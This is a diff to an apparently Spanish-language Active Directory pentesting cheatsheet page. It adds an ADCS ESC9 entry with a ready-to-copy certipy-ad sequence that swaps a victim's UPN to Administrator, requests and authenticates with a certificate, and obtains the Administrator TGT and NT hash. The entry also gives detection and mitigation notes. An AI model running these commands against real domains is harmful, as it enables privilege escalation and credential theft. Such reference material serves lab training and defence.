@@ -264,7 +264,7 @@
   <div class="wrap">
     <div class="sec-head"><span class="sec-id">▚</span><span class="sec-name">CHEATSHEET</span></div>
     <div class="sec-focus">Referencia de comandos por categoría técnica, lista para copiar</div>
-    <div style="color:var(--dim);font-size:19px;margin:-10px 0 18px;">Los comandos del knowledge base consolidados por objetivo técnico, para referencia rápida en laboratorios autorizados.</div>
+    <div style="color:var(--dim);font-size:19px;margin:-10px 0 18px;">Los comandos del knowledge base consolidados por objetivo técnico, para referencia rápida en laboratorios autorizados. También disponible como <a href="CHEATSHEET.md">referencia Markdown</a> (con teoría y herramientas explicadas por área).</div>
     <div id="cheat-body"></div>
   </div>
 </section>
@@ -617,6 +617,23 @@ certipy-ad relay -target 'http://$CA_HOST/certsrv/certfnsh.asp' -template Domain
     evidence:"Obtienes un .pfx que autentica como el principal impersonado.",
     detect:"Emisiones de certificado con SAN inusual y autenticación NTLM al endpoint de la CA.",
     mit:"Primaria: endurecer plantillas (quitar SAN arbitrario, exigir aprobación del manager). Hardening: habilitar EPA/HTTPS en la CA. Detección: auditar emisiones.",
+    ref:{label:"Certipy · GitHub",url:"https://github.com/ly4k/Certipy"}},
+   {n:"ADCS ESC9 (No Security Extension)",
+    pre:"Permiso para escribir el userPrincipalName de una cuenta víctima; una plantilla marcada con NO_SECURITY_EXTENSION donde la víctima pueda inscribirse; y binding de certificados no forzado a modo estricto en el DC.",
+    why:"Si el certificado no lleva la extensión de seguridad que ata el SID, el DC resuelve la identidad por UPN. Cambiando el UPN de la víctima al de un administrador, el certificado emitido para ella autentica como ese administrador.",
+    ident:"certipy find marca la plantilla como 'ESC9' / 'No Security Extension'; la víctima tiene userPrincipalName escribible.",
+    label:"UPN SWAP → REQ → RESTAURAR → AUTH",
+    cmd:`<span class="cmt"># 1. cambiar el UPN de la víctima al del objetivo (sin @dominio)</span>
+certipy-ad account update -u $USER@$DOMAIN -p $PASS -user $VICTIM -upn Administrator
+<span class="cmt"># 2. solicitar el certificado como la víctima (plantilla sin extensión de seguridad)</span>
+certipy-ad req -u $VICTIM@$DOMAIN -p $VICTIM_PASS -ca &lt;CA&gt; -template &lt;ESC9_TPL&gt;
+<span class="cmt"># 3. restaurar el UPN original de la víctima</span>
+certipy-ad account update -u $USER@$DOMAIN -p $PASS -user $VICTIM -upn $VICTIM@$DOMAIN
+<span class="cmt"># 4. autenticar con el certificado: se resuelve como Administrator</span>
+certipy-ad auth -pfx administrator.pfx -domain $DOMAIN`,
+    evidence:"certipy auth devuelve el TGT y el hash NT del Administrator.",
+    detect:"Cambios de userPrincipalName (5136) seguidos de emisión de certificado sobre una plantilla sin la extensión de seguridad.",
+    mit:"Primaria: habilitar la extensión de seguridad en las plantillas (retirar NO_SECURITY_EXTENSION) y forzar StrongCertificateBindingEnforcement en modo estricto. Hardening: restringir la escritura de userPrincipalName. Detección: auditar cambios de UPN y emisiones de certificado.",
     ref:{label:"Certipy · GitHub",url:"https://github.com/ly4k/Certipy"}},
    {n:"DCSync → Domain Admin",
     pre:"Hash o credencial de un principal con derechos de replicación (p.ej. una cuenta de DC).",
@@ -1228,6 +1245,10 @@ certipy-ad shadow auto -u $USER@$DOMAIN -p $PASS -account 'DC01$' -target $TARGE
 certipy-ad req -u $USER -p $PASS -ca &lt;CA&gt; -template &lt;VULN&gt; -upn Administrator@$DOMAIN
 <span class="cmt"># ESC8: relay al web enrollment de la CA</span>
 certipy-ad relay -target 'http://&lt;CA&gt;/certsrv/certfnsh.asp' -template DomainController
+<span class="cmt"># ESC9 (No Security Extension): swap de UPN de la víctima</span>
+certipy-ad account update -u $USER@$DOMAIN -p $PASS -user $VICTIM -upn Administrator
+certipy-ad req -u $VICTIM@$DOMAIN -p $VICTIM_PASS -ca &lt;CA&gt; -template &lt;ESC9_TPL&gt;
+certipy-ad account update -u $USER@$DOMAIN -p $PASS -user $VICTIM -upn $VICTIM@$DOMAIN
 <span class="cmt"># autenticar con el certificado obtenido</span>
 certipy-ad auth -pfx administrator.pfx -dc-ip $DC_IP`},
 
